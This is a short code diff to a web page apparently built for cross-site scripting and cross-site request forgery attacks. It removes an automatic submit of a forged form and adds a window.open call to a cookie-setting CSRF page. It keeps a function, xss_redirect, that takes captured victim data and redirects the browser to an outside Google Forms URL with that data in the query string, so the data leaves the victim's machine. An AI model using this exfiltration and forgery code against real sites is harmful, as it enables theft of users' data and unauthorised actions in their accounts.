@@ -13,13 +13,12 @@ layout: xss
 </form>
 
 <script>
-    document.getElementById("csrf-form").submit();
-
     function xss_redirect(data){
         console.log("XSS DATA", data);
         console.log(JSON.stringify(data));
         document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + JSON.stringify(data);        
     }
+    window.open("/csrf_to_setcookie.html");
     
 </script>
 
